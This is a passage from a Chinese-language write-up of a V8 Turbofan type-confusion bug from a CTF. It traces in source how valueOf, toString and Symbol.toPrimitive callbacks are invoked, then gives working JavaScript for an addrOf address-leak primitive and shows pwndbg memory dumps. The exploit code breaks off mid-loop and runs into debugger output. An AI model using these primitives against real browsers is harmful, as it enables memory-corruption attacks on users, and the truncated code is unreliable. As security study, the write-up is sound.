@@ -1,0 +1,139 @@
+    %OptimizeFunctionOnNextCall(opt_me);
+    opt_me(2345,b1);
+    // output： callback
+###  探寻回调函数-valueOf
+通过前面的分析我们找到了一处回调函数调用的地方`toPrimitive`属性，这已经可以用来进行漏洞利用了，但是还是没有找到最开始发现的`valueOf`回调函数调用的地方，所以还要继续分析！
+我们开始定义的包含`valueOf`的对象没有定义相应的`toPrimitive`属性，所以在`Generate_NonPrimitiveToPrimitive`中它应该会跳转到`ordinary_to_primitive`分支处执行，也就是会调用`OrdinaryToPrimitive`函数。这个函数的逻辑和前面分析的很相似，最后会跳转到`Generate_OrdinaryToPrimitive`函数中执行。
+    // srccode-factory.cc
+    // static
+    Callable CodeFactory::OrdinaryToPrimitive(Isolate* isolate,
+                                              OrdinaryToPrimitiveHint hint) {
+      return Callable(isolate->builtins()->OrdinaryToPrimitive(hint),
+                      TypeConversionDescriptor{});
+    }
+    // srcbuiltinsbuiltins.cc
+    Handle Builtins::OrdinaryToPrimitive(OrdinaryToPrimitiveHint hint) {
+      switch (hint) {
+        case OrdinaryToPrimitiveHint::kNumber:
+          return builtin_handle(kOrdinaryToPrimitive_Number);
+        case OrdinaryToPrimitiveHint::kString:
+          return builtin_handle(kOrdinaryToPrimitive_String);
+      }
+      UNREACHABLE();
+    }
+    // srcbuiltinsbuiltins-conversion-gen.cc
+    TF_BUILTIN(OrdinaryToPrimitive_Number, ConversionBuiltinsAssembler) {
+      Node* context = Parameter(Descriptor::kContext);
+      Node* input = Parameter(Descriptor::kArgument);
+      Generate_OrdinaryToPrimitive(context, input,
+                                   OrdinaryToPrimitiveHint::kNumber);
+    }
+`Generate_OrdinaryToPrimitive`函数中终于出现了我们所期望的内容，该函数依据hint的值来设置`method_names`变量中的内容，主要是`valueOf`和`toString`。然后会尝试从input中获取`valueOf/toString`属性，如果获取到的属性是`callable`，那么就调用它，所以我们定义的valueOf属性对应的回调函数会被调用，至此源码分析结束！
+    // srcbuiltinsbuiltins-conversion-gen.cc
+    // 7.1.1.1 OrdinaryToPrimitive ( O, hint )
+    void ConversionBuiltinsAssembler::Generate_OrdinaryToPrimitive(
+        Node* context, Node* input, OrdinaryToPrimitiveHint hint) {
+      VARIABLE(var_result, MachineRepresentation::kTagged);
+      Label return_result(this, &var_result);
+      // 依据hint来设置method_names
+      Handle method_names[2];
+      switch (hint) {
+        case OrdinaryToPrimitiveHint::kNumber:
+          method_names[0] = factory()->valueOf_string();
+          method_names[1] = factory()->toString_string();
+          break;
+        case OrdinaryToPrimitiveHint::kString:
+          method_names[0] = factory()->toString_string();
+          method_names[1] = factory()->valueOf_string();
+          break;
+      }
+      // 遍历method_names，依据method_name来获取input中对应的属性
+      for (Handle name : method_names) {
+        // Lookup the {name} on the {input}.
+        Node* method = GetProperty(context, input, name);
+        // Check if the {method} is callable.
+        // 检查获取到的method是否是callable
+        Label if_methodiscallable(this),
+            if_methodisnotcallable(this, Label::kDeferred);
+        GotoIf(TaggedIsSmi(method), &if_methodisnotcallable);
+        Node* method_map = LoadMap(method);
+        Branch(IsCallableMap(method_map), &if_methodiscallable,
+               &if_methodisnotcallable);
+        // 通过CallJS来调用我们的回调函数
+        BIND(&if_methodiscallable);
+        {
+          // Call the {method} on the {input}.
+          Callable callable = CodeFactory::Call(
+              isolate(), ConvertReceiverMode::kNotNullOrUndefined);
+          Node* result = CallJS(callable, context, method, input);
+          var_result.Bind(result);
+          // Return the {result} if it is a primitive.
+          GotoIf(TaggedIsSmi(result), &return_result);
+          Node* result_instance_type = LoadInstanceType(result);
+          GotoIf(IsPrimitiveInstanceType(result_instance_type), &return_result);
+        }
+        // Just continue with the next {name} if the {method} is not callable.
+        Goto(&if_methodisnotcallable);
+        BIND(&if_methodisnotcallable);
+      }
+      ThrowTypeError(context, MessageTemplate::kCannotConvertToPrimitive);
+      BIND(&return_result);
+      Return(var_result.value());
+    }
+###  小结
+本节以patch文件为切入点，从源码的角度分析了漏洞存在的地方，结合`数字经济线下赛`的解题思路找到了触发漏洞的方式，然后以此探寻了回调函数最终被调用的根源，最终找到了三种定义回调函数的方法：
+  * Symbol.toPrimitive属性
+  * valueOf属性
+  * toString属性
+## 漏洞利用 – Fake ArrayBuffer
+该利用方法是从`Sakura`师傅写的[34c3 v9
+writeup](http://eternalsakura13.com/2019/04/29/v9/)中学到的。最初我构造出addrOf和fakeObj之后被卡了很久，主要就是拿不到一个合法的map，从师傅的文章里面了解到伪造`ArrayBuffer
+map`并进一步伪造出`ArrayBuffer`是可行的。
+###  addrOf原语
+利用Turbofan对`BitwiseAnd`节点影响的误判，我们可以消除掉对象属性访问的`CheckMaps`节点，进而造成类型混淆。例如定义`let c
+=
+{x:1.2,y:1.3};`，在两次属性访问`c.x`和`c.y`之间插入`a&b`操作，c.y的`ChekMaps`节点仍会被消除，如果在回调函数中把`c.y`赋值为一个对象，那么`return
+c.y;`仍然会按照之前的类型`double`来返回数据，实现对象的地址信息泄露。由于正常写addrOf原语每调用一次之后就得重新写一个新的addrOf函数，因此我在`addrOf`中加入了部分动态生成的代码片段，如下所示：
+        function getObj(idx){
+            let c = 2.2;
+            eval(`c = {x:1.2,${'y'+idx}:2.2};`);
+            return c;
+        }
+        function addrOf(obj,cid){
+            eval(`
+                function vulfunc4leak(a,b,c){
+                    let d = 1.2;
+                    d = c.x+d;
+                    a&b;
+                    return c.${'y'+cid};
+                }
+                `);
+            let b0 = {
+                valueOf: function(){
+                    return 22223333;
+                }
+            }
+            let b = {
+                valueOf: function(){
+                    eval(`c.${'y'+cid} = obj;`);
+                    return 888888889999;
+                }
+            }
+            var c = getObj(cid);
+            for(let i=0;i
+     - prototype_validity cell: 0x3291ad202201 
+     - instance descriptors (own) #0: 0x0a8b57382321 
+     - layout descriptor: (nil)
+     - prototype: 0x3fb82f110fd1 
+     - constructor: 0x3fb82f110e31 
+     - dependent code: 0x0a8b57382391 
+     - construction counter: 0
+    pwndbg> x/20xg 0x55fbd984370
+    0x55fbd984370:  0x00000a8b57382251      0x1900042313080808
+    0x55fbd984380:  0x00000000082003ff      0x00003fb82f110fd1
+    0x55fbd984390:  0x00003fb82f110e31      0x0000000000000000
+    0x55fbd9843a0:  0x00000a8b57382321      0x0000000000000000
+    0x55fbd9843b0:  0x00000a8b57382391      0x00003291ad202201
+    pwndbg> p {double} 0x55fbd984378
+    $1 = 2.8757499612354866e-188
+    pwndbg> p {double} 0x55fbd984380
